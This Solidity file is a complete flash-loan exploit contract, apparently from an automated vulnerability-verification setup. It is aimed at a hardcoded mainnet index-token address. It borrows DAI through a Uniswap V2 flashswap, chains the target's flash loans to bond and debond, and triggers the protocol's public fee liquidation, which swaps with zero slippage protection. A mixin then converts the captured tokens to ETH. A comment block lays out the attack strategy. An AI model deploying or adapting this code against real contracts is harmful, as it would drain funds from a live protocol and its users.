// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

struct IndexAssetInfo {
  address token;
  uint256 weighting;
  uint256 basePriceUSDX96;
  address c1;
  uint256 q1;
}

interface IERC20Like {
  function balanceOf(address account) external view returns (uint256);

  function totalSupply() external view returns (uint256);

  function transfer(address to, uint256 amount) external returns (bool);

  function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20MetadataLike is IERC20Like {
  function decimals() external view returns (uint8);
}

interface IIndexToken is IERC20Like {
  function BOND_FEE() external view returns (uint256);

  function DEBOND_FEE() external view returns (uint256);

  function lpStakingPool() external view returns (address);

  function getAllAssets() external view returns (IndexAssetInfo[] memory);

  function bond(address token, uint256 amount) external;

  function debond(
    uint256 amount,
    address[] calldata token,
    uint8[] calldata percentage
  ) external;

  function flash(
    address recipient,
    address token,
    uint256 amount,
    bytes calldata data
  ) external;
}

interface IStakingPoolTokenLike {
  function stakingToken() external view returns (address);
}

interface IUniswapV2FactoryLike {
  function getPair(
    address tokenA,
    address tokenB
  ) external view returns (address);
}

interface IUniswapV2PairLike {
  function token0() external view returns (address);

  function token1() external view returns (address);

  function factory() external view returns (address);

  function getReserves()
    external
    view
    returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

  function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data
  ) external;
}

interface IUniswapV2CalleeLike {
  function uniswapV2Call(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external;
}

interface IFlashLoanRecipientLike {
  function callback(bytes calldata data) external;
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is IUniswapV2CalleeLike, IFlashLoanRecipientLike, __AHTokenToEthMixin {
  address public constant TARGET =
    0xdbB20A979a92ccCcE15229e41c9B082D5b5d7E31;
  address public constant WETH =
    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address public constant DEAD =
    0x000000000000000000000000000000000000dEaD;
  uint256 private constant FLASH_FEE_DAI = 10e18;

  address public immutable pair;
  address public immutable dai;
  address public immutable factory;
  bool private immutable _pairToken0IsDai;

  uint256 private _profitAmount;

  bool public executed;
  bool public hypothesisValidated;
  bool public hypothesisRefuted;

  uint256 public feeInventoryAtExecution;
  uint256 public feeSwapTriggerThreshold;
  uint256 public pairIdxReserveAtExecution;
  uint256 public pairDaiReserveAtExecution;
  uint256 public bondFeeBpsAtExecution;
  uint256 public debondFeeBpsAtExecution;

  address[] private _assetTokens;
  uint256[] private _assetWeights;
  uint256[] private _flashAmounts;
  uint256 private _baseBondAmount;
  uint256 private _pairFlashBorrowAmount;

  constructor() {
    address stakingPool = IIndexToken(TARGET).lpStakingPool();
    address v2Pair = IStakingPoolTokenLike(stakingPool).stakingToken();
    pair = v2Pair;

    address token0 = IUniswapV2PairLike(v2Pair).token0();
    address token1 = IUniswapV2PairLike(v2Pair).token1();
    dai = token0 == TARGET ? token1 : token0;
    _pairToken0IsDai = token0 == dai;
    factory = IUniswapV2PairLike(v2Pair).factory();
  }

  function executeOnOpportunity() external {
    require(!executed, "executed");
    executed = true;

    feeInventoryAtExecution = IIndexToken(TARGET).balanceOf(TARGET);
    feeSwapTriggerThreshold = IIndexToken(TARGET).totalSupply() / 10000;
    bondFeeBpsAtExecution = IIndexToken(TARGET).BOND_FEE();
    debondFeeBpsAtExecution = IIndexToken(TARGET).DEBOND_FEE();

    (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair)
      .getReserves();
    if (_pairToken0IsDai) {
      pairDaiReserveAtExecution = uint256(reserve0);
      pairIdxReserveAtExecution = uint256(reserve1);
    } else {
      pairDaiReserveAtExecution = uint256(reserve1);
      pairIdxReserveAtExecution = uint256(reserve0);
    }

    _prepareBondPlan();

    /*
      Strategy note:

      - The finding still hinges on the same public `_feeSwap` trigger and the
        protocol's unconditional `amountOutMin = 0` liquidation path.
      - The funding side is adapted to the required `v2_flashswap_funding`
        strategy. A small DAI flashswap from the live IDX/DAI pair funds the
        public flash fees needed to bootstrap same-tx inventory, then a dust
        non-pool transfer triggers the vulnerable fee liquidation once the pair
        is unlocked again.
      - These extra funding steps are realistic public on-chain actions and do
        not alter the reported liquidation root cause.
    */

    _pairFlashBorrowAmount = (_assetTokens.length * FLASH_FEE_DAI) + 1e18;
    if (_pairToken0IsDai) {
      IUniswapV2PairLike(pair).swap(
        _pairFlashBorrowAmount,
        0,
        address(this),
        abi.encode(_pairFlashBorrowAmount)
      );
    } else {
      IUniswapV2PairLike(pair).swap(
        0,
        _pairFlashBorrowAmount,
        address(this),
        abi.encode(_pairFlashBorrowAmount)
      );
    }

    uint256 targetBal = IERC20Like(TARGET).balanceOf(address(this));
    if (targetBal > 1) {
      _safeTransfer(TARGET, DEAD, 1);
    }

    _profitAmount = IERC20Like(TARGET).balanceOf(address(this));
    hypothesisValidated = _profitAmount > 0;
    hypothesisRefuted = _profitAmount == 0;
        _ahFinalizeTokenToEth();
  }

  function uniswapV2Call(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external override {
    require(msg.sender == pair, "pair");
    require(sender == address(this), "sender");

    uint256 borrowedDai = _pairToken0IsDai ? amount0 : amount1;
    require(borrowedDai == abi.decode(data, (uint256)), "borrow");

    _safeApprove(dai, TARGET, type(uint256).max);
    _flashAsset(0);

    uint256 mintedTarget = IERC20Like(TARGET).balanceOf(address(this));
    require(mintedTarget > 0, "minted");

    uint256 debondAmount = (mintedTarget * 3) / 4;
    if (debondAmount > 0) {
      address[] memory emptyTokens = new address[](0);
      uint8[] memory emptyPercentages = new uint8[](0);
      IIndexToken(TARGET).debond(debondAmount, emptyTokens, emptyPercentages);
    }

    uint256 repayAmount = _sameTokenFlashRepay(borrowedDai);
    if (IERC20Like(dai).balanceOf(address(this)) < repayAmount) {
      _swapAssetsForDai(repayAmount);
    }
    require(IERC20Like(dai).balanceOf(address(this)) >= repayAmount, "repay");
    _safeTransfer(dai, pair, repayAmount);
  }

  function callback(bytes calldata data) external override {
    require(msg.sender == TARGET, "flash");
    uint256 idx = abi.decode(data, (uint256));
    if (idx + 1 < _assetTokens.length) {
      _flashAsset(idx + 1);
      return;
    }

    for (uint256 i; i < _assetTokens.length; i++) {
      _safeApprove(_assetTokens[i], TARGET, type(uint256).max);
    }
    IIndexToken(TARGET).bond(_assetTokens[0], _baseBondAmount);
  }

  function profitToken() external pure returns (address) {
    return TARGET;
  }

  function profitAmount() external view returns (uint256) {
    return _profitAmount;
  }

  function _prepareBondPlan() internal {
    delete _assetTokens;
    delete _assetWeights;
    delete _flashAmounts;

    IndexAssetInfo[] memory assets = IIndexToken(TARGET).getAllAssets();
    require(assets.length > 0, "assets");

    uint8 baseDecimals = IERC20MetadataLike(assets[0].token).decimals();
    uint256 baseWeight = assets[0].weighting;
    uint256 baseCapacity = type(uint256).max;

    for (uint256 i; i < assets.length; i++) {
      uint8 tokenDecimals = IERC20MetadataLike(assets[i].token).decimals();
      uint256 vaultBalance = IERC20Like(assets[i].token).balanceOf(TARGET);
      uint256 candidate = (vaultBalance * baseWeight) / assets[i].weighting;
      if (tokenDecimals > baseDecimals) {
        candidate = candidate / (10 ** (tokenDecimals - baseDecimals));
      } else if (baseDecimals > tokenDecimals) {
        candidate = candidate * (10 ** (baseDecimals - tokenDecimals));
      }
      if (candidate < baseCapacity) {
        baseCapacity = candidate;
      }
    }

    _baseBondAmount = (baseCapacity * 95) / 100;
    require(_baseBondAmount > 0, "base");

    for (uint256 i; i < assets.length; i++) {
      uint8 tokenDecimals = IERC20MetadataLike(assets[i].token).decimals();
      uint256 flashAmount = (_baseBondAmount * assets[i].weighting) /
        baseWeight;
      if (tokenDecimals > baseDecimals) {
        flashAmount = flashAmount * (10 ** (tokenDecimals - baseDecimals));
      } else if (baseDecimals > tokenDecimals) {
        flashAmount = flashAmount / (10 ** (baseDecimals - tokenDecimals));
      }
      require(flashAmount > 0, "flash");
      _assetTokens.push(assets[i].token);
      _assetWeights.push(assets[i].weighting);
      _flashAmounts.push(flashAmount);
    }
  }

  function _flashAsset(uint256 idx) internal {
    IIndexToken(TARGET).flash(
      address(this),
      _assetTokens[idx],
      _flashAmounts[idx],
      abi.encode(idx)
    );
  }

  function _swapAssetsForDai(uint256 minDaiNeeded) internal {
    for (uint256 i; i < _assetTokens.length; i++) {
      if (IERC20Like(dai).balanceOf(address(this)) >= minDaiNeeded) {
        return;
      }

      address token = _assetTokens[i];
      uint256 bal = IERC20Like(token).balanceOf(address(this));
      if (bal == 0) {
        continue;
      }

      if (token == dai) {
        continue;
      }

      address directPair = IUniswapV2FactoryLike(factory).getPair(token, dai);
      if (directPair != address(0)) {
        _swapExactOnPair(directPair, token, bal, address(this));
        continue;
      }

      if (token == WETH) {
        address wethDaiPair = IUniswapV2FactoryLike(factory).getPair(
          WETH,
          dai
        );
        require(wethDaiPair != address(0), "weth/dai");
        _swapExactOnPair(wethDaiPair, WETH, bal, address(this));
        continue;
      }

      address tokenWethPair = IUniswapV2FactoryLike(factory).getPair(
        token,
        WETH
      );
      address wethDai = IUniswapV2FactoryLike(factory).getPair(WETH, dai);
      if (tokenWethPair == address(0) || wethDai == address(0)) {
        continue;
      }

      uint256 wethOut = _swapExactOnPair(
        tokenWethPair,
        token,
        bal,
        address(this)
      );
      if (wethOut > 0) {
        _swapExactOnPair(wethDai, WETH, wethOut, address(this));
      }
    }
  }

  function _swapExactOnPair(
    address pairAddr,
    address tokenIn,
    uint256 amountIn,
    address to
  ) internal returns (uint256 amountOut) {
    IUniswapV2PairLike swapPair = IUniswapV2PairLike(pairAddr);
    address token0 = swapPair.token0();
    (uint112 reserve0, uint112 reserve1, ) = swapPair.getReserves();

    bool zeroForOne = tokenIn == token0;
    uint256 reserveIn = zeroForOne ? uint256(reserve0) : uint256(reserve1);
    uint256 reserveOut = zeroForOne ? uint256(reserve1) : uint256(reserve0);

    _safeTransfer(tokenIn, pairAddr, amountIn);
    uint256 pairBalanceIn = IERC20Like(tokenIn).balanceOf(pairAddr);
    uint256 actualIn = pairBalanceIn - reserveIn;
    amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);

    swapPair.swap(
      zeroForOne ? 0 : amountOut,
      zeroForOne ? amountOut : 0,
      to,
      new bytes(0)
    );
  }

  function _getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) internal pure returns (uint256) {
    uint256 amountInWithFee = amountIn * 997;
    return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
  }

  function _sameTokenFlashRepay(
    uint256 borrowedAmount
  ) internal pure returns (uint256) {
    return ((borrowedAmount * 1000) / 997) + 1;
  }

  function _safeApprove(
    address token,
    address spender,
    uint256 amount
  ) internal {
    (bool ok, bytes memory ret) = token.call(
      abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
    );
    require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve");
  }

  function _safeTransfer(address token, address to, uint256 amount) internal {
    (bool ok, bytes memory ret) = token.call(
      abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
    );
    require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer");
  }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
